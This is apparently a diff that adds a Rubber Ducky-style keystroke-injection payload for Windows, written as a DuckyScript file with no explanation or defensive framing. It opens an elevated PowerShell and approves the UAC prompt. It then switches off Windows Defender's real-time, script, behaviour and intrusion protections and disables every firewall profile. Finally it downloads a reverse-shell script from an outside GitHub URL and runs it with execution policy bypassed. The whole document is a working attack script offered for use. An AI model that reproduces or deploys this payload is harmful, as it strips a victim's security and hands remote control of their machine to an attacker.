@@ -1,0 +1,23 @@
+DELAY 750
+ENTER
+DELAY 1000
+ENTER
+DELAY 200
+GUI r
+DELAY 400
+STRING powershell
+CTRL-SHIFT ENTER
+DELAY 2500
+ALT s
+DELAY 2000
+STRING powershell -command 'Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true'
+ENTER
+DELAY 1500
+STRING Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+ENTER
+DELAY 500
+STRING Invoke-WebRequest -Uri "https://raw.githubusercontent.com/alvaroarenas69/scrips-powershell/main/reverseshell.ps1" -OutFile "reverseshell.ps1"
+ENTER
+DELAY 800
+STRING powershell -ExecutionPolicy Bypass -File ".\reverseshell.ps1"
+ENTER
